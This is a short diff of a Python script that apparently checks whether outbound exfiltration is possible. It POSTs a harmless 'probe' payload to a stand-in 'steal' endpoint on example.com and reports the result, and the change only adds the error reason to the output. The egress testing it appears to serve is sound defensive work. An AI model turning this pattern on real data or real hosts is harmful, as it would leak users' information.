@@ -8,4 +8,4 @@ except Exception as e:
 try:
     print("exfil=%s" % u.urlopen(u.Request("https://example.com/steal", data=b"probe"), timeout=5).status)
 except Exception as e:
-    print("exfil=%s %s" % (type(e).__name__, getattr(e, "code", "")))
+    print("exfil=%s %s" % (type(e).__name__, getattr(e, "code", "") or getattr(e, "reason", "")))
